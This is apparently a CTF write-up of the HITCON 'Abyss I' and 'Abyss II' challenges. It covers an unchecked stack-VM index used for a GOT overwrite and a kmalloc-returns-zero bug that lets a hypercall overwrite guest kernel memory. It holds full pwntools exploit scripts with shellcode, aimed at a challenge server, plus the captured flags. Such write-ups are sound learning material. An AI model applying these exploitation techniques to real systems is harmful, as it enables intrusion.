# Abyss I II III
## Abyss I
> hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
* NX disable.
* `swap` function doesn't check the index, and the `machine` == `stack[-1]`.
```clike
void swap_()
{
  unsigned int tmp;

  tmp = stack[machine - 1];
  stack[machine - 1] = stack[machine - 2];
  stack[machine - 2] = tmp;
}
```
* We can control the value of `machine` by `swap()`.
```python
p = '31' + 'a' + op['minus']         # -31
p += op['swap']                      # stack point to write.got
p += 'a' + op['store']               # store the high 4 byte
p += str( 2107662 + 70 ) + op['add'] # add offset -> write.got point to our input
p += 'a' + op['fetch']               # recover high 4 byte
p += op['write'],                    # write() to jmp to our shellcode
```
* exploit:
```python
#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    shellcraft.pushstr( 'flag\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )

y.interactive()
```
## Abyss II
> hitcon{take_out_all_memory,_take_away_your_soul}
* `rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);`
* Where `vm->mem` is our vm phisical address.
* Kernel entry is 0, if we can let `but` == 0, so that  we are able to overwrite the kernel memory.
* Hypervisor will get the return value of kmalloc().
* `Hypercall read handler`:
```clike
vaddr = *(_DWORD *)(vm->run + *(_QWORD *)(vm->run + 40LL));
if ( (unsigned __int64)vaddr >= vm->mem_size )
     __assert_fail("0 <= (offset) && (offset) < vm->mem_size", "hypercall.c", 0x7Eu, "handle_rw");
arg = (_QWORD *)(*(_QWORD *)&vm->mem + vaddr);
fd = *arg;
buf = arg[1];
len = arg[2];
MAY_INIT_FD_MAP();
if ( fd >= 0 && fd <= 255 && fd_map[fd].opening )
{
    if ( buf >= vm->mem_size )
        __assert_fail("0 <= (paddr) && (paddr) < vm->mem_size", "hypercall.c", 0x83u, "handle_rw");
    read_ret = rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);
    if ( read_ret < 0 )
        read_ret = -*__errno_location();
}
else
{
    read_ret = -9;
}
```
* Kernel sys_read():
```c
signed __int64 __usercall sys_read@<rax>(__int64 size_@<rdx>, int fd_@<edi>, unsigned __int64 buf@<rsi>)
{
  signed __int64 ret; // rbx
  __int64 l; // r12
  void *vbuf; // rbp
  _QWORD *dst; // r13
  __int64 paddr; // rsi
  __int64 v8; // rcx

  ret = -9i64;
  if ( fd_ >= 0 )
  {
    l = size_;
    vbuf = (void *)buf;
    ret = -14i64;
    if ( (unsigned int)access_ok(size_, 1, buf) )
    {
      dst = (_QWORD *)kmalloc(l, 0);
      paddr = physical((signed __int64)dst);
      ret = (signed int)hyper_read(l, v8, fd_, paddr);
      if ( ret >= 0 )
        qmemcpy(vbuf, dst, ret);
      kfree(dst);
    }
  }
  return ret;
}

__int64 __usercall hyper_read@<rax>(__int64 len@<rdx>, __int64 a2@<rcx>, int fd@<edi>, __int64 buf@<rsi>)
{
  __int64 l; // r12
  _QWORD *vaddr; // rax
  _QWORD *v; // rbx
  unsigned int paddr; // eax
  unsigned int v8; // ST0C_4

  l = len;
  vaddr = (_QWORD *)kmalloc(0x18ui64, 0);
  *vaddr = fd;
  vaddr[1] = buf;
  vaddr[2] = l;
  v = vaddr;
  paddr = physical((signed __int64)vaddr);
  vmmcall(0x8001u, paddr);
  kfree(v);
  return v8;
}
```
* Pass the return value of kmalloc() to hypervisor:
```c
dst = (_QWORD *)kmalloc(l, 0);
paddr = physical((signed __int64)dst);
ret = (signed int)hyper_read(l, v8, fd_, paddr);
```
* Now our goal is to let `kmalloc` return 0 value.
* Kernel kmalloc():
```c
signed __int64 __usercall kmalloc@<rax>(unsigned __int64 len@<rdi>, int align@<esi>)
{
  unsigned __int64 nb; // r8
  signed __int64 now; // rsi
  signed __int64 v4; // rdx
  unsigned __int64 now_size; // rax
  bool equal; // zf
  __int64 next; // rcx
  signed __int64 ret; // rax
  _QWORD *v9; // rcx
  signed __int64 r; // [rsp+0h] [rbp-10h]

  if ( len > 0xFFFFFFFF )
    return 0i64;
  nb = len + 16;
  if ( ((_BYTE)len + 16) & 0x7F )
    nb = (nb & 0xFFFFFFFFFFFFFF80ui64) + 0x80;
  if ( align )
  {
    if ( align != 0x1000 )
      hlt((unsigned __int64)"kmalloc.c#kmalloc: invalid alignment");
    if ( !((0xFF0 - MEMORY[0x4840]) & 0xFFF) || malloc_top((0xFF0 - MEMORY[0x4840]) & 0xFFF) )
    {
      malloc_top(nb);                           // r
      kfree(v9);
      ret = r;
      if ( r )
      {
        if ( !(r & 0xFFF) )
          return ret;
        hlt((unsigned __int64)"kmalloc.c#kmalloc: alignment request failed");
      }
    }
  }
  else
  {
    now = MEMORY[0x4860];
    v4 = 0x4850i64;
    while ( now )
    {
      now_size = *(_QWORD *)now;
      if ( (unsigned __int64)(*(_QWORD *)now - 1i64) > 0xFFFFFFFE || now_size & 0xF )
      {
        hlt((unsigned __int64)"kmalloc.c: invalid size of sorted bin");
LABEL_12:
        *(_QWORD *)(v4 + 16) = next;
        if ( !equal )
        {
          *(_QWORD *)(now + nb) = now_size - nb;
          insert_sorted((_QWORD *)(now + nb));
        }
        ret = now + 16;
        *(_QWORD *)now = nb;
        *(_OWORD *)(now + 8) = 0i64;
        if ( now != -16 )
          return ret;
        break;
      }
      equal = nb == now_size;
      next = *(_QWORD *)(now + 16);
      if ( nb <= now_size )
        goto LABEL_12;
      v4 = now;
      now = *(_QWORD *)(now + 16);
    }
    ret = malloc_top(nb);
    if ( ret )
      return ret;
  }
  return 0i64;
}
```
* There are two conditions that `kmalloc` will return 0.
    * len > 0xffffffff:
    ```c
    if ( len > 0xFFFFFFFF )
        return 0i64;
    ```
    * if kmalloc doesnt find the appropriate chunk in sorted bin, it will allocate from top by `malloc_top`.
    ```c
    ret = malloc_top(nb);
    if ( ret )
      return ret;
    ```
    * If `malloc_top` return 0, it won't return 0 directly, but `kmalloc` will still return 0 in the end.
    ```c
        ret = malloc_top(nb);
        if ( ret )
          return ret;
      }
      return 0;
    }
    ```
* We can not use the condition 1, because if we want to let the `len` to be 0x100000000, we need a memory space exactly has the 0x100000000 long space, due to `access_ok()` checking.
* We can't mmap that huge memory space.
* We have to go condition 2, let `malloc_top` return 0.
* `malloc_top`:
```c
signed __int64 malloc_top(unsigned __int64 nb)
{
  signed __int64 ret; // rax
  __int64 top; // rax
  unsigned __int64 new_top; // rdi

  ret = 0;
  if ( arena.top_size >= nb )
  {
    top = arena.top;
    arena.top_size -= nb;
    arena.top->size = nb;
    new_top = arena.top + nb;
    ret = arena.top + 16;
    arena.top = new_top;
  }
  return ret;
}
```
* Just give a size which lager than `arena.top_size`, it will return 0.
* `mmap(0, 0x1000000, 7)` -> `arena.top_size` remain the size < 0x1000000.
* `sys_read( 0, buf, 0x1000000 )` -> `kmalloc` in `hypercall read` will return 0.
* Pass 0 to hypervisor, `hypercall read handler` will do `read( 0, &vm->mem + 0 , 0x1000000 )`.
* Now we can overwrite the whole kernel space! 
* For flag2, I overwrite the opcodes in  kernel `sys_open` which do checking filename with `nop`.
* ORW flag2.
* exploit:
```python
#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    '''
    mov rdi, 0
    mov rsi, 0x1000000
    mov rdx, 7
    mov r10, 16
    mov r8, -1
    mov r9, 0
    mov rax, 8
    inc rax
    syscall

    mov rbp, rax
    push rsp
    ''' +
    shellcraft.write( 1 , 'rsp' , 8 ) + 
    shellcraft.read( 0 , 'rbp' , 0x1000000 ) +
    shellcraft.pushstr( 'flag2\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )
y.recvline()
user_stack = u64( y.recv(8) )
success( 'User stack -> %s' % hex( user_stack ) )

k_mod = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 ) + kernel[0x15d:0x9a4] + '\x90' * 0x75

sleep(1)
y.send( k_mod )

y.interactive()
```